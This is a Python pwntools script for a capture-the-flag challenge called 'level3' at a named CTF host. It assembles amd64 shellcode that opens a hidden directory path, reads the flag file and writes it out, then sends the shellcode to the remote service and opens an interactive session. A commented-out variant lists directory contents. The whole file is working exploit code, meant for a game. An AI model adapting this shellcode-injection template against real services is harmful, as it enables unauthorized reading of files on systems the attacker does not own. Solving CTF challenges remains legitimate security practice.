from pwn import *

context.arch = 'amd64'
binary = context.binary = ELF('./level3')
# gHyy8peRmmIU0yVAeiPq96VmhE6W7JkM
# payload = shellcraft.open('/gHyy8peRmmIU0yVAeiPq96VmhE6W7JkM', oflag=constants.O_DIRECTORY)
# payload += shellcraft.getdents('rax', 'rsp', 1048)
# payload += shellcraft.write(1, 'rsp', 'rax')
# payload += shellcraft.exit(0)

payload = shellcraft.pushstr('/gHyy8peRmmIU0yVAeiPq96VmhE6W7JkM/flag\x00')
payload += shellcraft.open('rsp', 0, 0)
payload += shellcraft.read('rax', 'rsp', 0x70)
payload += shellcraft.write(1, 'rsp', 0x70)
payload += shellcraft.exit(0)

print(payload)
payload = asm(payload)

#p = binary.process()
p = remote('nc.ctf.unitedctf.ca', 6003)
p.sendline(payload)

pprint(p.recv())
p.interactive()
# P96gpflag